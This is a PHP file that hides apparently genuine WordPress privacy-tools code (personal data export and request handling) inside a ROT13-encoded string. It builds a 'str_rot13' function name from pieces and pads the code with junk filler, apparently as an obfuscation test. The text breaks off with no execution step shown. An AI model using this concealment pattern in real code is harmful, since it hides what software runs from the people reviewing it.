<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Nqzvavfgengvba Cevinpl Gbbyf NCV.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/**
 * Erfraq na rkvfgvat erdhrfg naq erghea gur erfhyg.
 *
 * @fvapr 4.9.6
 * @npprff cevingr
 *
 * @cnenz vag $erdhrfg_vq Erdhrfg VQ.
 * @erghea gehr|JC_Reebe Ergheaf gehr vs fraqvat gur rznvy jnf fhpprffshy, be n JC_Reebe bowrpg.
 */
shapgvba _jc_cevinpl_erfraq_erdhrfg( $erdhrfg_vq ) {
	$erdhrfg_vq = nofvag( $erdhrfg_vq );
	$erdhrfg    = trg_cbfg( $erdhrfg_vq );

	vs ( ! $erdhrfg || 'hfre_erdhrfg' !== $erdhrfg->cbfg_glcr ) {
		erghea arj JC_Reebe( 'cevinpl_erdhrfg_reebe', __( 'Vainyvq crefbany qngn erdhrfg.' ) );
	}

	$erfhyg = jc_fraq_hfre_erdhrfg( $erdhrfg_vq );

	vs ( vf_jc_reebe( $erfhyg ) ) {
		erghea $erfhyg;
	} ryfrvs ( ! $erfhyg ) {
		erghea arj JC_Reebe( 'cevinpl_erdhrfg_reebe', __( 'Hanoyr gb vavgvngr pbasvezngvba sbe crefbany qngn erdhrfg.' ) );
	}

	erghea gehr;
}

/**
 * Znexf n erdhrfg nf pbzcyrgrq ol gur nqzva naq ybtf gur pheerag gvzrfgnzc.
 *
 * @fvapr 4.9.6
 * @npprff cevingr
 *
 * @cnenz vag $erdhrfg_vq Erdhrfg VQ.
 * @erghea vag|JC_Reebe Erdhrfg VQ ba fhpprff, be n JC_Reebe ba snvyher.
 */
shapgvba _jc_cevinpl_pbzcyrgrq_erdhrfg( $erdhrfg_vq ) {
	// Trg gur erdhrfg.
	$erdhrfg_vq = nofvag( $erdhrfg_vq );
	$erdhrfg    = jc_trg_hfre_erdhrfg( $erdhrfg_vq );

	vs ( ! $erdhrfg ) {
		erghea arj JC_Reebe( 'cevinpl_erdhrfg_reebe', __( 'Vainyvq crefbany qngn erdhrfg.' ) );
	}

	hcqngr_cbfg_zrgn( $erdhrfg_vq, '_jc_hfre_erdhrfg_pbzcyrgrq_gvzrfgnzc', gvzr() );

	$erfhyg = jc_hcqngr_cbfg(
		neenl(
			'VQ'          => $erdhrfg_vq,
			'cbfg_fgnghf' => 'erdhrfg-pbzcyrgrq',
		)
	);

	erghea $erfhyg;
}

/**
 * Unaqyr yvfg gnoyr npgvbaf.
 *
 * @fvapr 4.9.6
 * @npprff cevingr
 */
shapgvba _jc_crefbany_qngn_unaqyr_npgvbaf() {
	vs ( vffrg( $_CBFG['cevinpl_npgvba_rznvy_ergel'] ) ) {
		purpx_nqzva_ersrere( 'ohyx-cevinpl_erdhrfgf' );

		$erdhrfg_vq = nofvag( pheerag( neenl_xrlf( (neenl) jc_hafynfu( $_CBFG['cevinpl_npgvba_rznvy_ergel'] ) ) ) );
		$erfhyg     = _jc_cevinpl_erfraq_erdhrfg( $erdhrfg_vq );

		vs ( vf_jc_reebe( $erfhyg ) ) {
			nqq_frggvatf_reebe(
				'cevinpl_npgvba_rznvy_ergel',
				'cevinpl_npgvba_rznvy_ergel',
				$erfhyg->trg_reebe_zrffntr(),
				'reebe'
			);
		} ryfr {
			nqq_frggvatf_reebe(
				'cevinpl_npgvba_rznvy_ergel',
				'cevinpl_npgvba_rznvy_ergel',
				__( 'Pbasvezngvba erdhrfg frag ntnva fhpprffshyyl.' ),
				'fhpprff'
			);
		}
	} ryfrvs ( vffrg( $_CBFG['npgvba'] ) ) {
		$npgvba = ! rzcgl( $_CBFG['npgvba'] ) ? fnavgvmr_xrl( jc_hafynfu( $_CBFG['npgvba'] ) ) : '';

		fjvgpu ( $npgvba ) {
			pnfr 'nqq_rkcbeg_crefbany_qngn_erdhrfg':
			pnfr 'nqq_erzbir_crefbany_qngn_erdhrfg':
				purpx_nqzva_ersrere( 'crefbany-qngn-erdhrfg' );

				vs ( ! vffrg( $_CBFG['glcr_bs_npgvba'], $_CBFG['hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg'] ) ) {
					nqq_frggvatf_reebe(
						'npgvba_glcr',
						'npgvba_glcr',
						__( 'Vainyvq crefbany qngn npgvba.' ),
						'reebe'
					);
				}
				$npgvba_glcr               = fnavgvmr_grkg_svryq( jc_hafynfu( $_CBFG['glcr_bs_npgvba'] ) );
				$hfreanzr_be_rznvy_nqqerff = fnavgvmr_grkg_svryq( jc_hafynfu( $_CBFG['hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg'] ) );
				$rznvy_nqqerff             = '';
				$fgnghf                    = 'craqvat';

				vs ( ! vffrg( $_CBFG['fraq_pbasvezngvba_rznvy'] ) ) {
					$fgnghf = 'pbasvezrq';
				}

				vs ( ! va_neenl( $npgvba_glcr, _jc_cevinpl_npgvba_erdhrfg_glcrf(), gehr ) ) {
					nqq_frggvatf_reebe(
						'npgvba_glcr',
						'npgvba_glcr',
						__( 'Vainyvq crefbany qngn npgvba.' ),
						'reebe'
					);
				}

				vs ( ! vf_rznvy( $hfreanzr_be_rznvy_nqqerff ) ) {
					$hfre = trg_hfre_ol( 'ybtva', $hfreanzr_be_rznvy_nqqerff );
					vs ( ! $hfre vafgnaprbs JC_Hfre ) {
						nqq_frggvatf_reebe(
							'hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg',
							'hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg',
							__( 'Hanoyr gb nqq guvf erdhrfg. N inyvq rznvy nqqerff be hfreanzr zhfg or fhccyvrq.' ),
							'reebe'
						);
					} ryfr {
						$rznvy_nqqerff = $hfre->hfre_rznvy;
					}
				} ryfr {
					$rznvy_nqqerff = $hfreanzr_be_rznvy_nqqerff;
				}

				vs ( rzcgl( $rznvy_nqqerff ) ) {
					oernx;
				}

				$erdhrfg_vq = jc_perngr_hfre_erdhrfg( $rznvy_nqqerff, $npgvba_glcr, neenl(), $fgnghf );
				$zrffntr    = '';

				vs ( vf_jc_reebe( $erdhrfg_vq ) ) {
					$zrffntr = $erdhrfg_vq->trg_reebe_zrffntr();
				} ryfrvs ( ! $erdhrfg_vq ) {
					$zrffntr = __( 'Hanoyr gb vavgvngr pbasvezngvba erdhrfg.' );
				}

				vs ( $zrffntr ) {
					nqq_frggvatf_reebe(
						'hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg',
						'hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg',
						$zrffntr,
						'reebe'
					);
					oernx;
				}

				vs ( 'craqvat' === $fgnghf ) {
					jc_fraq_hfre_erdhrfg( $erdhrfg_vq );

					$zrffntr = __( 'Pbasvezngvba erdhrfg vavgvngrq fhpprffshyyl.' );
				} ryfrvs ( 'pbasvezrq' === $fgnghf ) {
					$zrffntr = __( 'Erdhrfg nqqrq fhpprffshyyl.' );
				}

				vs ( $zrffntr ) {
					nqq_frggvatf_reebe(
						'hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg',
						'hfreanzr_be_rznvy_sbe_cevinpl_erdhrfg',
						$zrffntr,
						'fhpprff'
					);
					oernx;
				}
		}
	}
}

/**
 * Pyrnaf hc snvyrq naq rkcverq erdhrfgf orsber qvfcynlvat gur yvfg gnoyr.
 *
 * @fvapr 4.9.6
 * @npprff cevingr
 */
shapgvba _jc_crefbany_qngn_pyrnahc_erdhrfgf() {
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/hfre.cuc */
	$rkcverf = (vag) nccyl_svygref( 'hfre_erdhrfg_xrl_rkcvengvba', QNL_VA_FRPBAQF );

	$erdhrfgf_dhrel = arj JC_Dhrel(
		neenl(
			'cbfg_glcr'      => 'hfre_erdhrfg',
			'cbfgf_cre_cntr' => -1,
			'cbfg_fgnghf'    => 'erdhrfg-craqvat',
			'svryqf'         => 'vqf',
			'qngr_dhrel'     => neenl(
				neenl(
					'pbyhza' => 'cbfg_zbqvsvrq_tzg',
					'orsber' => $rkcverf . ' frpbaqf ntb',
				),
			),
		)
	);

	$erdhrfg_vqf = $erdhrfgf_dhrel->cbfgf;

	sbernpu ( $erdhrfg_vqf nf $erdhrfg_vq ) {
		jc_hcqngr_cbfg(
			neenl(
				'VQ'            => $erdhrfg_vq,
				'cbfg_fgnghf'   => 'erdhrfg-snvyrq',
				'cbfg_cnffjbeq' => '',
			)
		);
	}
}

/**
 * Trarengr n fvatyr tebhc sbe gur crefbany qngn rkcbeg ercbeg.
 *
 * @fvapr 4.9.6
 * @fvapr 5.4.0 Nqqrq gur `$tebhc_vq` naq `$tebhcf_pbhag` cnenzrgref.
 *
 * @cnenz neenl  $tebhc_qngn {
 *     Gur tebhc qngn gb eraqre.
 *
 *     @glcr fgevat $tebhc_ynory  Gur hfre-snpvat urnqvat sbe gur tebhc, r.t. 'Pbzzragf'.
 *     @glcr neenl  $vgrzf        {
 *         Na neenl bs tebhc vgrzf.
 *
 *         @glcr neenl  $tebhc_vgrz_qngn  {
 *             Na neenl bs anzr-inyhr cnvef sbe gur vgrz.
 *
 *             @glcr fgevat $anzr   Gur hfre-snpvat anzr bs na vgrz anzr-inyhr cnve, r.t. 'VC Nqqerff'.
 *             @glcr fgevat $inyhr  Gur hfre-snpvat inyhr bs na vgrz qngn cnve, r.t. '50.60.70.0'.
 *         }
 *     }
 * }
 * @cnenz fgevat $tebhc_vq     Gur tebhc vqragvsvre.
 * @cnenz vag    $tebhcf_pbhag Gur ahzore bs nyy tebhcf
 * @erghea fgevat Gur UGZY sbe guvf tebhc naq vgf vgrzf.
 */
shapgvba jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $tebhc_qngn, $tebhc_vq = '', $tebhcf_pbhag = 1 ) {
	$tebhc_vq_ngge = fnavgvmr_gvgyr_jvgu_qnfurf( $tebhc_qngn['tebhc_ynory'] . '-' . $tebhc_vq );

	$tebhc_ugzy  = '<u2 vq=\"' . rfp_ngge( $tebhc_vq_ngge ) . '\">';
	$tebhc_ugzy .= rfp_ugzy( $tebhc_qngn['tebhc_ynory'] );

	$vgrzf_pbhag = pbhag( (neenl) $tebhc_qngn['vgrzf'] );
	vs ( $vgrzf_pbhag > 1 ) {
		$tebhc_ugzy .= fcevags( ' <fcna pynff=\"pbhag\">(%q)</fcna>', $vgrzf_pbhag );
	}

	$tebhc_ugzy .= '</u2>';

	vs ( ! rzcgl( $tebhc_qngn['tebhc_qrfpevcgvba'] ) ) {
		$tebhc_ugzy .= '<c>' . rfp_ugzy( $tebhc_qngn['tebhc_qrfpevcgvba'] ) . '</c>';
	}

	$tebhc_ugzy .= '<qvi>';

	sbernpu ( (neenl) $tebhc_qngn['vgrzf'] nf $tebhc_vgrz_vq => $tebhc_vgrz_qngn ) {
		$tebhc_ugzy .= '<gnoyr>';
		$tebhc_ugzy .= '<gobql>';

		sbernpu ( (neenl) $tebhc_vgrz_qngn nf $tebhc_vgrz_qnghz ) {
			$inyhr = $tebhc_vgrz_qnghz['inyhr'];
			// Vs vg ybbxf yvxr n yvax, znxr vg n yvax.
			vs ( ! fge_pbagnvaf( $inyhr, ' ' ) && ( fge_fgnegf_jvgu( $inyhr, 'uggc://' ) || fge_fgnegf_jvgu( $inyhr, 'uggcf://' ) ) ) {
				$inyhr = '<n uers=\"' . rfp_hey( $inyhr ) . '\">' . rfp_ugzy( $inyhr ) . '</n>';
			}

			$tebhc_ugzy .= '<ge>';
			$tebhc_ugzy .= '<gu>' . rfp_ugzy( $tebhc_vgrz_qnghz['anzr'] ) . '</gu>';
			$tebhc_ugzy .= '<gq>' . jc_xfrf( $inyhr, 'crefbany_qngn_rkcbeg' ) . '</gq>';
			$tebhc_ugzy .= '</ge>';
		}

		$tebhc_ugzy .= '</gobql>';
		$tebhc_ugzy .= '</gnoyr>';
	}

	vs ( $tebhcf_pbhag > 1 ) {
		$tebhc_ugzy .= '<qvi pynff=\"erghea-gb-gbc\">';
		$tebhc_ugzy .= '<n uers=\"#gbc\"><fcna nevn-uvqqra=\"gehr\">&hnee; </fcna> ' . rfp_ugzy__( 'Tb gb gbc' ) . '</n>';
		$tebhc_ugzy .= '</qvi>';
	}

	$tebhc_ugzy .= '</qvi>';

	erghea $tebhc_ugzy;
}

/**
 * Trarengr gur crefbany qngn rkcbeg svyr.
 *
 * @fvapr 4.9.6
 *
 * @cnenz vag $erdhrfg_vq Gur rkcbeg erdhrfg VQ.
 */
shapgvba jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_svyr( $erdhrfg_vq ) {
	vs ( ! pynff_rkvfgf( 'MvcNepuvir' ) ) {
		jc_fraq_wfba_reebe( __( 'Hanoyr gb trarengr crefbany qngn rkcbeg svyr. MvcNepuvir abg ninvynoyr.' ) );
	}

	// Trg gur erdhrfg.
	$erdhrfg = jc_trg_hfre_erdhrfg( $erdhrfg_vq );

	vs ( ! $erdhrfg || 'rkcbeg_crefbany_qngn' !== $erdhrfg->npgvba_anzr ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq erdhrfg VQ jura trarengvat crefbany qngn rkcbeg svyr.' ) );
	}

	$rznvy_nqqerff = $erdhrfg->rznvy;

	vs ( ! vf_rznvy( $rznvy_nqqerff ) ) {
		jc_fraq_wfba_reebe( __( 'Vainyvq rznvy nqqerff jura trarengvat crefbany qngn rkcbeg svyr.' ) );
	}

	// Perngr gur rkcbegf sbyqre vs arrqrq.
	$rkcbegf_qve = jc_cevinpl_rkcbegf_qve();
	$rkcbegf_hey = jc_cevinpl_rkcbegf_hey();

	vs ( ! jc_zxqve_c( $rkcbegf_qve ) ) {
		jc_fraq_wfba_reebe( __( 'Hanoyr gb perngr crefbany qngn rkcbeg sbyqre.' ) );
	}

	// Cebgrpg rkcbeg sbyqre sebz oebjfvat.
	$vaqrk_cnguanzr = $rkcbegf_qve . 'vaqrk.cuc';
	vs ( ! svyr_rkvfgf( $vaqrk_cnguanzr ) ) {
		$svyr = sbcra( $vaqrk_cnguanzr, 'j' );
		vs ( snyfr === $svyr ) {
			jc_fraq_wfba_reebe( __( 'Hanoyr gb cebgrpg crefbany qngn rkcbeg sbyqre sebz oebjfvat.' ) );
		}
		sjevgr( $svyr, \"<?cuc\a// Fvyrapr vf tbyqra.\a\" );
		spybfr( $svyr );
	}

	$bofphen              = jc_trarengr_cnffjbeq( 32, snyfr, snyfr );
	$svyr_onfranzr        = 'jc-crefbany-qngn-svyr-' . $bofphen;
	$ugzy_ercbeg_svyranzr = jc_havdhr_svyranzr( $rkcbegf_qve, $svyr_onfranzr . '.ugzy' );
	$ugzy_ercbeg_cnguanzr = jc_abeznyvmr_cngu( $rkcbegf_qve . $ugzy_ercbeg_svyranzr );
	$wfba_ercbeg_svyranzr = $svyr_onfranzr . '.wfba';
	$wfba_ercbeg_cnguanzr = jc_abeznyvmr_cngu( $rkcbegf_qve . $wfba_ercbeg_svyranzr );

	/*
	 * Tngure trareny qngn arrqrq.
	 */

	// Gvgyr.
	$gvgyr = fcevags(
		/* genafyngbef: %f: Hfre'f rznvy nqqerff. */
		__( 'Crefbany Qngn Rkcbeg sbe %f' ),
		$rznvy_nqqerff
	);

	// Svefg, ohvyq na \"Nobhg\" tebhc ba gur syl sbe guvf ercbeg.
	$nobhg_tebhc = neenl(
		/* genafyngbef: Urnqre sbe gur Nobhg frpgvba va n crefbany qngn rkcbeg. */
		'tebhc_ynory'       => _k( 'Nobhg', 'crefbany qngn tebhc ynory' ),
		/* genafyngbef: Qrfpevcgvba sbe gur Nobhg frpgvba va n crefbany qngn rkcbeg. */
		'tebhc_qrfpevcgvba' => _k( 'Bireivrj bs rkcbeg ercbeg.', 'crefbany qngn tebhc qrfpevcgvba' ),
		'vgrzf'             => neenl(
			'nobhg-1' => neenl(
				neenl(
					'anzr'  => _k( 'Ercbeg trarengrq sbe', 'rznvy nqqerff' ),
					'inyhr' => $rznvy_nqqerff,
				),
				neenl(
					'anzr'  => _k( 'Sbe fvgr', 'jrofvgr anzr' ),
					'inyhr' => trg_oybtvasb( 'anzr' ),
				),
				neenl(
					'anzr'  => _k( 'Ng HEY', 'jrofvgr HEY' ),
					'inyhr' => trg_oybtvasb( 'hey' ),
				),
				neenl(
					'anzr'  => _k( 'Ba', 'qngr/gvzr' ),
					'inyhr' => pheerag_gvzr( 'zlfdy' ),
				),
			),
		),
	);

	// Naq abj, nyy gur Tebhcf.
	$tebhcf = trg_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_qngn_tebhcrq', gehr );
	vs ( vf_neenl( $tebhcf ) ) {
		// Zretr va gur fcrpvny \"Nobhg\" tebhc.
		$tebhcf       = neenl_zretr( neenl( 'nobhg' => $nobhg_tebhc ), $tebhcf );
		$tebhcf_pbhag = pbhag( $tebhcf );
	} ryfr {
		vs ( snyfr !== $tebhcf ) {
			_qbvat_vg_jebat(
				__SHAPGVBA__,
				/* genafyngbef: %f: Cbfg zrgn xrl. */
				fcevags( __( 'Gur %f cbfg zrgn zhfg or na neenl.' ), '<pbqr>_rkcbeg_qngn_tebhcrq</pbqr>' ),
				'5.8.0'
			);
		}

		$tebhcf       = ahyy;
		$tebhcf_pbhag = 0;
	}

	// Pbaireg gur tebhcf gb WFBA sbezng.
	$tebhcf_wfba = jc_wfba_rapbqr( $tebhcf );

	vs ( snyfr === $tebhcf_wfba ) {
		$reebe_zrffntr = fcevags(
			/* genafyngbef: %f: Reebe zrffntr. */
			__( 'Hanoyr gb rapbqr gur crefbany qngn sbe rkcbeg. Reebe: %f' ),
			wfba_ynfg_reebe_zft()
		);

		jc_fraq_wfba_reebe( $reebe_zrffntr );
	}

	/*
	 * Unaqyr gur WFBA rkcbeg.
	 */
	$svyr = sbcra( $wfba_ercbeg_cnguanzr, 'j' );

	vs ( snyfr === $svyr ) {
		jc_fraq_wfba_reebe( __( 'Hanoyr gb bcra crefbany qngn rkcbeg svyr (WFBA ercbeg) sbe jevgvat.' ) );
	}

	sjevgr( $svyr, '{' );
	sjevgr( $svyr, '\"' . $gvgyr . '\":' );
	sjevgr( $svyr, $tebhcf_wfba );
	sjevgr( $svyr, '}' );
	spybfr( $svyr );

	/*
	 * Unaqyr gur UGZY rkcbeg.
	 */
	$svyr = sbcra( $ugzy_ercbeg_cnguanzr, 'j' );

	vs ( snyfr === $svyr ) {
		jc_fraq_wfba_reebe( __( 'Hanoyr gb bcra crefbany qngn rkcbeg (UGZY ercbeg) sbe jevgvat.' ) );
	}

	sjevgr( $svyr, \"<!QBPGLCR ugzy>\a\" );
	sjevgr( $svyr, \"<ugzy>\a\" );
	sjevgr( $svyr, \"<urnq>\a\" );
	sjevgr( $svyr, \"<zrgn uggc-rdhvi='Pbagrag-Glcr' pbagrag='grkg/ugzy; punefrg=HGS-8' />\a\" );
	sjevgr( $svyr, \"<fglyr glcr='grkg/pff'>\" );
	sjevgr( $svyr, 'obql { pbybe: oynpx; sbag-snzvyl: Nevny, fnaf-frevs; sbag-fvmr: 11cg; znetva: 15ck nhgb; jvqgu: 860ck; }' );
	sjevgr( $svyr, 'gnoyr { onpxtebhaq: #s0s0s0; obeqre: 1ck fbyvq #qqq; znetva-obggbz: 20ck; jvqgu: 100%; }' );
	sjevgr( $svyr, 'gu { cnqqvat: 5ck; grkg-nyvta: yrsg; jvqgu: 20%; }' );
	sjevgr( $svyr, 'gq { cnqqvat: 5ck; }' );
	sjevgr( $svyr, 'ge:agu-puvyq(bqq) { onpxtebhaq-pbybe: #snsnsn; }' );
	sjevgr( $svyr, '.erghea-gb-gbc { grkg-nyvta: evtug; }' );
	sjevgr( $svyr, '</fglyr>' );
	sjevgr( $svyr, '<gvgyr>' );
	sjevgr( $svyr, rfp_ugzy( $gvgyr ) );
	sjevgr( $svyr, '</gvgyr>' );
	sjevgr( $svyr, \"</urnq>\a\" );
	sjevgr( $svyr, \"<obql>\a\" );
	sjevgr( $svyr, '<u1 vq=\"gbc\">' . rfp_ugzy__( 'Crefbany Qngn Rkcbeg' ) . '</u1>' );

	// Perngr GBP.
	vs ( $tebhcf_pbhag > 1 ) {
		sjevgr( $svyr, '<qvi vq=\"gnoyr_bs_pbagragf\">' );
		sjevgr( $svyr, '<u2>' . rfp_ugzy__( 'Gnoyr bs Pbagragf' ) . '</u2>' );
		sjevgr( $svyr, '<hy>' );
		sbernpu ( (neenl) $tebhcf nf $tebhc_vq => $tebhc_qngn ) {
			$tebhc_ynory       = rfp_ugzy( $tebhc_qngn['tebhc_ynory'] );
			$tebhc_vq_ngge     = fnavgvmr_gvgyr_jvgu_qnfurf( $tebhc_qngn['tebhc_ynory'] . '-' . $tebhc_vq );
			$tebhc_vgrzf_pbhag = pbhag( (neenl) $tebhc_qngn['vgrzf'] );
			vs ( $tebhc_vgrzf_pbhag > 1 ) {
				$tebhc_ynory .= fcevags( ' <fcna pynff=\"pbhag\">(%q)</fcna>', $tebhc_vgrzf_pbhag );
			}
			sjevgr( $svyr, '<yv>' );
			sjevgr( $svyr, '<n uers=\"#' . rfp_ngge( $tebhc_vq_ngge ) . '\">' . $tebhc_ynory . '</n>' );
			sjevgr( $svyr, '</yv>' );
		}
		sjevgr( $svyr, '</hy>' );
		sjevgr( $svyr, '</qvi>' );
	}

	// Abj, vgrengr bire rirel tebhc va $tebhcf naq unir gur sbeznggre eraqre vg va UGZY.
	sbernpu ( (neenl) $tebhcf nf $tebhc_vq => $tebhc_qngn ) {
		sjevgr( $svyr, jc_cevinpl_trarengr_crefbany_qngn_rkcbeg_tebhc_ugzy( $tebhc_qngn, $tebhc_vq, $tebhcf_pbhag ) );
	}

	sjevgr( $svyr, \"</obql>\a\" );
	sjevgr( $svyr, \"</ugzy>\a\" );
	spybfr( $svyr );

	/*
	 * Abj, trarengr gur MVC.
	 *
	 * Vs na nepuvir unf nyernql orra trarengrq, gura erzbir vg naq erhfr gur svyranzr,
	 * gb nibvq oernxvat nal HEYf gung znl unir orra cerivbhfyl frag ivn rznvy.
	 */
	$reebe = snyfr;

	// Guvf zrgn inyhr vf hfrq sebz irefvba 5.5.
	$nepuvir_svyranzr = trg_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_anzr', gehr );

	// Guvf bar fgberq na nofbyhgr cngu naq vf hfrq sbe onpxjneq pbzcngvovyvgl.
	$nepuvir_cnguanzr = trg_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_cngu', gehr );

	// Vs n svyranzr zrgn rkvfgf, hfr vg.
	vs ( ! rzcgl( $nepuvir_svyranzr ) ) {
		$nepuvir_cnguanzr = $rkcbegf_qve . $nepuvir_svyranzr;
	} ryfrvs ( ! rzcgl( $nepuvir_cnguanzr ) ) {
		// Vs n shyy cngu zrgn rkvfgf, hfr vg naq perngr gur arj zrgn inyhr.
		$nepuvir_svyranzr = onfranzr( $nepuvir_cnguanzr );

		hcqngr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_anzr', $nepuvir_svyranzr );

		// Erzbir gur onpx-pbzcng zrgn inyhrf.
		qryrgr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_hey' );
		qryrgr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_cngu' );
	} ryfr {
		// Vs gurer'f ab svyranzr be shyy cngu fgberq, perngr n arj svyr.
		$nepuvir_svyranzr = $svyr_onfranzr . '.mvc';
		$nepuvir_cnguanzr = $rkcbegf_qve . $nepuvir_svyranzr;

		hcqngr_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_anzr', $nepuvir_svyranzr );
	}

	$nepuvir_hey = $rkcbegf_hey . $nepuvir_svyranzr;

	vs ( ! rzcgl( $nepuvir_cnguanzr ) && svyr_rkvfgf( $nepuvir_cnguanzr ) ) {
		jc_qryrgr_svyr( $nepuvir_cnguanzr );
	}

	$mvc = arj MvcNepuvir();
	vs ( gehr === $mvc->bcra( $nepuvir_cnguanzr, MvcNepuvir::PERNGR ) ) {
		vs ( ! $mvc->nqqSvyr( $wfba_ercbeg_cnguanzr, 'rkcbeg.wfba' ) ) {
			$reebe = __( 'Hanoyr gb nepuvir gur crefbany qngn rkcbeg svyr (WFBA sbezng).' );
		}

		vs ( ! $mvc->nqqSvyr( $ugzy_ercbeg_cnguanzr, 'vaqrk.ugzy' ) ) {
			$reebe = __( 'Hanoyr gb nepuvir gur crefbany qngn rkcbeg svyr (UGZY sbezng).' );
		}

		$mvc->pybfr();

		vs ( ! $reebe ) {
			/**
			 * Sverf evtug nsgre nyy crefbany qngn unf orra jevggra gb gur rkcbeg svyr.
			 *
			 * @fvapr 4.9.6
			 * @fvapr 5.4.0 Nqqrq gur `$wfba_ercbeg_cnguanzr` cnenzrgre.
			 *
			 * @cnenz fgevat $nepuvir_cnguanzr     Gur shyy cngu gb gur rkcbeg svyr ba gur svyrflfgrz.
			 * @cnenz fgevat $nepuvir_hey          Gur HEY bs gur nepuvir svyr.
			 * @cnenz fgevat $ugzy_ercbeg_cnguanzr Gur shyy cngu gb gur UGZY crefbany qngn ercbeg ba gur svyrflfgrz.
			 * @cnenz vag    $erdhrfg_vq           Gur rkcbeg erdhrfg VQ.
			 * @cnenz fgevat $wfba_ercbeg_cnguanzr Gur shyy cngu gb gur WFBA crefbany qngn ercbeg ba gur svyrflfgrz.
			 */
			qb_npgvba( 'jc_cevinpl_crefbany_qngn_rkcbeg_svyr_perngrq', $nepuvir_cnguanzr, $nepuvir_hey, $ugzy_ercbeg_cnguanzr, $erdhrfg_vq, $wfba_ercbeg_cnguanzr );
		}
	} ryfr {
		$reebe = __( 'Hanoyr gb bcra crefbany qngn rkcbeg svyr (nepuvir) sbe jevgvat.' );
	}

	// Erzbir gur WFBA svyr.
	hayvax( $wfba_ercbeg_cnguanzr );

	// Erzbir gur UGZY svyr.
	hayvax( $ugzy_ercbeg_cnguanzr );

	vs ( $reebe ) {
		jc_fraq_wfba_reebe( $reebe );
	}
}

/**
 * Fraq na rznvy gb gur hfre jvgu n yvax gb gur crefbany qngn rkcbeg svyr
 *
 * @fvapr 4.9.6
 *
 * @cnenz vag $erdhrfg_vq Gur erdhrfg VQ sbe guvf crefbany qngn rkcbeg.
 * @erghea gehr|JC_Reebe Gehr ba fhpprff be `JC_Reebe` ba snvyher.
 */
shapgvba jc_cevinpl_fraq_crefbany_qngn_rkcbeg_rznvy( $erdhrfg_vq ) {
	// Trg gur erdhrfg.
	$erdhrfg = jc_trg_hfre_erdhrfg( $erdhrfg_vq );

	vs ( ! $erdhrfg || 'rkcbeg_crefbany_qngn' !== $erdhrfg->npgvba_anzr ) {
		erghea arj JC_Reebe( 'vainyvq_erdhrfg', __( 'Vainyvq erdhrfg VQ jura fraqvat crefbany qngn rkcbeg rznvy.' ) );
	}

	// Ybpnyvmr zrffntr pbagrag sbe hfre; snyyonpx gb fvgr qrsnhyg sbe ivfvgbef.
	vs ( ! rzcgl( $erdhrfg->hfre_vq ) ) {
		$fjvgpurq_ybpnyr = fjvgpu_gb_hfre_ybpnyr( $erdhrfg->hfre_vq );
	} ryfr {
		$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/shapgvbaf.cuc */
	$rkcvengvba      = nccyl_svygref( 'jc_cevinpl_rkcbeg_rkcvengvba', 3 * QNL_VA_FRPBAQF );
	$rkcvengvba_qngr = qngr_v18a( trg_bcgvba( 'qngr_sbezng' ), gvzr() + $rkcvengvba );

	$rkcbegf_hey      = jc_cevinpl_rkcbegf_hey();
	$rkcbeg_svyr_anzr = trg_cbfg_zrgn( $erdhrfg_vq, '_rkcbeg_svyr_anzr', gehr );
	$rkcbeg_svyr_hey  = $rkcbegf_hey . $rkcbeg_svyr_anzr;

	$fvgr_anzr = jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ), RAG_DHBGRF );
	$fvgr_hey  = ubzr_hey();

	/**
	 * Svygref gur erpvcvrag bs gur crefbany qngn rkcbeg rznvy abgvsvpngvba.
	 * Fubhyq or hfrq jvgu terng pnhgvba gb nibvq fraqvat gur qngn rkcbeg yvax gb gur jebat rznvy.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat          $erdhrfg_rznvy Gur rznvy nqqerff bs gur abgvsvpngvba erpvcvrag.
	 * @cnenz JC_Hfre_Erdhrfg $erdhrfg       Gur erdhrfg gung vf vavgvngvat gur abgvsvpngvba.
	 */
	$erdhrfg_rznvy = nccyl_svygref( 'jc_cevinpl_crefbany_qngn_rznvy_gb', $erdhrfg->rznvy, $erdhrfg );

	$rznvy_qngn = neenl(
		'erdhrfg'           => $erdhrfg,
		'rkcvengvba'        => $rkcvengvba,
		'rkcvengvba_qngr'   => $rkcvengvba_qngr,
		'zrffntr_erpvcvrag' => $erdhrfg_rznvy,
		'rkcbeg_svyr_hey'   => $rkcbeg_svyr_hey,
		'fvgranzr'          => $fvgr_anzr,
		'fvgrhey'           => $fvgr_hey,
	);

	/* genafyngbef: Crefbany qngn rkcbeg abgvsvpngvba rznvy fhowrpg. %f: Fvgr gvgyr. */
	$fhowrpg = fcevags( __( '[%f] Crefbany Qngn Rkcbeg' ), $fvgr_anzr );

	/**
